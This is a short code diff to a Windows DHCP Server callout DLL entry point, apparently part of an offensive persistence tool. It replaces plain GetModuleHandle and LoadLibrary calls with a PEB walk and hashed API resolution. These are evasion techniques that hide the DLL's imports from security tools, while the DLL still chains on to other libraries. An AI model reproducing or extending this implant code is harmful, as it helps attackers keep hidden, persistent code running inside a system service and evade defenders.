@@ -42,12 +42,18 @@ DWORD CALLBACK kdhcp_DhcpServerCalloutEntry(IN LPWSTR ChainDlls, IN DWORD Callou
 	RtlZeroMemory(CalloutTbl, sizeof(DHCP_CALLOUT_TABLE));
 
 
-	HMODULE hKernel = GetModuleHandleA("kernel32.dll");
-	FARPROC funcAddr = getFunctionByHash(hKernel, 0x003db390f);
+	//HMODULE hKernel = GetModuleHandleA("kernel32.dll");
+	HMODULE hKernel32Base = GetModuleBaseFromPEB(L"kernel32.dll");
+	//FARPROC funcAddr = getFunctionByHash(hKernel, 0x003db390f);
+	FARPROC funcAddr = getFunctionByHash(hKernel32Base, H_GetProcAddress);
 	customGetProcAddress GetProcAddress_ = (customGetProcAddress)funcAddr;
 
+	FARPROC fpLoadLib = getFunctionByHash(hKernel32Base, H_LoadLibraryW);
+	customLoadLibraryW LoadLibraryW_ = (customLoadLibraryW)fpLoadLib;
+
 	if (ChainDlls) {
-		if (kdhcp_nextLibrary = LoadLibrary(ChainDlls)) {
+		//if (kdhcp_nextLibrary = LoadLibrary(ChainDlls)) {
+		if (kdhcp_nextLibrary = LoadLibraryW_(ChainDlls)) {
 			if (nextEntry = (LPDHCP_ENTRY_POINT_FUNC)
 				GetProcAddress_(kdhcp_nextLibrary, DHCP_CALLOUT_ENTRY_POINT))
 			{
